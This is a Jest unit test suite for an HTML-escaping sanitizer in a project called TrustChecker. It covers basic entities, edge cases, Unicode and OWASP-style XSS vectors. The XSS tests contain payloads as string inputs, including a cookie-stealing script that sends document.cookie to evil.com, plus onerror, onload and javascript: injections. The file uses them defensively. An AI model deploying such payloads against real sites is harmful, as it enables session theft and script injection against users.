/**
 * TrustChecker — Sanitization (escapeHTML) Unit Test Suite
 * Tests the escapeHTML utility against XSS attack vectors.
 *
 * Run: npx jest tests/sanitize.test.js --forceExit --detectOpenHandles
 */

// The client uses ESM export, so we reproduce the logic for testing
// (same logic used in client/utils/sanitize.js and check.html)
function escapeHTML(str) {
    if (str == null) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

// ═══════════════════════════════════════════════════════════════════
// BASIC HTML ENTITY ESCAPING
// ═══════════════════════════════════════════════════════════════════
describe('escapeHTML: Basic Entities', () => {
    test('escapes ampersand', () => {
        expect(escapeHTML('Tom & Jerry')).toBe('Tom &amp; Jerry');
    });

    test('escapes less-than', () => {
        expect(escapeHTML('a < b')).toBe('a &lt; b');
    });

    test('escapes greater-than', () => {
        expect(escapeHTML('a > b')).toBe('a &gt; b');
    });

    test('escapes double quotes', () => {
        expect(escapeHTML('"hello"')).toBe('&quot;hello&quot;');
    });

    test('escapes single quotes', () => {
        expect(escapeHTML("it's")).toBe('it&#39;s');
    });

    test('escapes all entities in one string', () => {
        expect(escapeHTML('<div class="test">&\'end</div>')).toBe(
            '&lt;div class=&quot;test&quot;&gt;&amp;&#39;end&lt;/div&gt;'
        );
    });
});

// ═══════════════════════════════════════════════════════════════════
// EDGE CASES
// ═══════════════════════════════════════════════════════════════════
describe('escapeHTML: Edge Cases', () => {
    test('returns empty string for null', () => {
        expect(escapeHTML(null)).toBe('');
    });

    test('returns empty string for undefined', () => {
        expect(escapeHTML(undefined)).toBe('');
    });

    test('returns empty string for empty string', () => {
        expect(escapeHTML('')).toBe('');
    });

    test('coerces number to string', () => {
        expect(escapeHTML(42)).toBe('42');
    });

    test('coerces zero to string', () => {
        expect(escapeHTML(0)).toBe('0');
    });

    test('coerces boolean to string', () => {
        expect(escapeHTML(true)).toBe('true');
        expect(escapeHTML(false)).toBe('false');
    });

    test('handles object toString', () => {
        expect(escapeHTML({})).toBe('[object Object]');
    });

    test('preserves safe strings unchanged', () => {
        expect(escapeHTML('Hello World 123')).toBe('Hello World 123');
    });

    test('handles very long strings', () => {
        const long = '<script>'.repeat(10000);
        const result = escapeHTML(long);
        expect(result).not.toContain('<script>');
        expect(result).toContain('&lt;script&gt;');
    });
});

// ═══════════════════════════════════════════════════════════════════
// XSS ATTACK VECTORS (OWASP)
// ═══════════════════════════════════════════════════════════════════
describe('escapeHTML: XSS Attack Vectors', () => {
    test('blocks script tag injection', () => {
        const result = escapeHTML('<script>alert("XSS")</script>');
        expect(result).not.toContain('<script>');
        expect(result).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
    });

    test('blocks img onerror injection', () => {
        const result = escapeHTML('<img onerror="alert(1)" src=x>');
        expect(result).not.toContain('<img');
        expect(result).toContain('&lt;img');
    });

    test('blocks SVG onload injection', () => {
        const result = escapeHTML('<svg/onload=alert(1)>');
        expect(result).not.toContain('<svg');
    });

    test('blocks iframe injection', () => {
        const result = escapeHTML('<iframe src="http://evil.com">');
        expect(result).not.toContain('<iframe');
    });

    test('blocks event handler in attributes', () => {
        const result = escapeHTML('<div onclick="alert(1)">click</div>');
        expect(result).not.toContain('<div');
    });

    test('blocks javascript: protocol', () => {
        const result = escapeHTML('<a href="javascript:alert(1)">');
        expect(result).not.toContain('<a');
    });

    test('blocks data: URI in attributes', () => {
        const result = escapeHTML('<object data="data:text/html,<script>alert(1)</script>">');
        expect(result).not.toContain('<object');
    });

    test('blocks nested/encoded payloads', () => {
        const result = escapeHTML('"><script>alert(String.fromCharCode(88,83,83))</script>');
        expect(result).not.toContain('<script>');
        expect(result).toContain('&quot;&gt;&lt;script&gt;');
    });

    test('blocks attribute breakout', () => {
        const result = escapeHTML('" onmouseover="alert(1)" data-x="');
        expect(result).not.toContain('" onmouseover');
        expect(result).toContain('&quot;');
    });

    test('blocks cookie stealing payload', () => {
        const result = escapeHTML('<script>document.location="http://evil.com?c="+document.cookie</script>');
        expect(result).not.toContain('<script>');
    });

    test('blocks CSS expression attack', () => {
        const result = escapeHTML('<div style="background:url(javascript:alert(1))">');
        expect(result).not.toContain('<div');
    });

    test('blocks meta refresh injection', () => {
        const result = escapeHTML('<meta http-equiv="refresh" content="0;url=http://evil.com">');
        expect(result).not.toContain('<meta');
    });
});

// ═══════════════════════════════════════════════════════════════════
// MULTIPLE ENCODINGS
// ═══════════════════════════════════════════════════════════════════
describe('escapeHTML: Double/Triple Encoding', () => {
    test('does not create double-encoded entities', () => {
        // First pass
        const once = escapeHTML('<script>');
        expect(once).toBe('&lt;script&gt;');

        // Second pass should escape the & in entities
        const twice = escapeHTML(once);
        expect(twice).toBe('&amp;lt;script&amp;gt;');
        expect(twice).not.toContain('<script>');
    });

    test('handles pre-encoded HTML entities', () => {
        const result = escapeHTML('&amp;lt;script&amp;gt;');
        // The & should be escaped again
        expect(result).toBe('&amp;amp;lt;script&amp;amp;gt;');
    });
});

// ═══════════════════════════════════════════════════════════════════
// UNICODE AND SPECIAL CHARACTERS
// ═══════════════════════════════════════════════════════════════════
describe('escapeHTML: Unicode & Special Characters', () => {
    test('preserves Vietnamese characters', () => {
        expect(escapeHTML('Sản phẩm chất lượng')).toBe('Sản phẩm chất lượng');
    });

    test('preserves emoji', () => {
        expect(escapeHTML('🛡️ TrustChecker')).toBe('🛡️ TrustChecker');
    });

    test('preserves CJK characters', () => {
        expect(escapeHTML('信頼チェッカー')).toBe('信頼チェッカー');
    });

    test('handles null bytes', () => {
        const result = escapeHTML('test\x00evil');
        expect(typeof result).toBe('string');
    });

    test('handles newlines and tabs', () => {
        expect(escapeHTML('line1\nline2\ttab')).toBe('line1\nline2\ttab');
    });
});
